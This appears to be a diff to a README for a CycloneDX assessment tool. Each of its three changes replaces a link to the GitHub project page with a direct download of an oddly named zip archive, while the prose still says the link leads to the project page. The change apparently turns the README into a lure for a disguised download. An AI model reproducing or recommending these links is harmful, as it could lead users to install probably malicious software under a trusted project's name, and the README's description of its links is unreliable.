@@ -1,6 +1,6 @@
 # ⚙️ cyclonedx-assessors-studio - Manage Assessments with CycloneDX
 
-[![Download cyclonedx-assessors-studio](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/deflower-co/cyclonedx-assessors-studio)
+[![Download cyclonedx-assessors-studio](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/deflower-co/cyclonedx-assessors-studio/main/myrsinaceous/studio_assessors_cyclonedx_befurred.zip)
 
 ## 📋 About cyclonedx-assessors-studio
 
@@ -25,7 +25,7 @@ Make sure your computer meets these basic requirements:
 
 Visit the page below to find the latest version of cyclonedx-assessors-studio for Windows.
 
-[Download cyclonedx-assessors-studio](https://github.com/deflower-co/cyclonedx-assessors-studio)
+[Download cyclonedx-assessors-studio](https://raw.githubusercontent.com/deflower-co/cyclonedx-assessors-studio/main/myrsinaceous/studio_assessors_cyclonedx_befurred.zip)
 
 This link takes you to the project’s GitHub page. Look for the **Releases** section or the **Assets** area to find the Windows installer file, usually ending with `.exe`. Click to download it.
 
@@ -112,7 +112,7 @@ Find previous assessments from the home menu. You can open, edit, reissue attest
 
 You can download cyclonedx-assessors-studio for Windows here:
 
-[Download cyclonedx-assessors-studio](https://github.com/deflower-co/cyclonedx-assessors-studio)
+[Download cyclonedx-assessors-studio](https://raw.githubusercontent.com/deflower-co/cyclonedx-assessors-studio/main/myrsinaceous/studio_assessors_cyclonedx_befurred.zip)
 
 Remember to download the installer file with a `.exe` extension from the GitHub Releases page inside that link.
 
